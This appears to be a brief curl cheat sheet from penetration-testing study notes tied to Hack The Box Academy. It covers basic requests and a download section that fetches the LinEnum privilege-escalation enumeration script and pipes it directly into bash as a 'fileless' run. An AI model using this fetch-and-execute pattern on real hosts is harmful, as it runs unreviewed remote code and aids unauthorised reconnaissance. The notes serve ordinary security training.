```
curl http://SERVER_IP:PORT/
```
## **HEADER**
```
curl -I https://academy.hackthebox.com
```
## **POST**
```
curl -s http://SERVER_IP:PORT/ -X POST
```
```
curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"
```
## DOWNLOAD
#### Download a File Using cURL
```shell
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
#### Fileless Download with cURL
```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
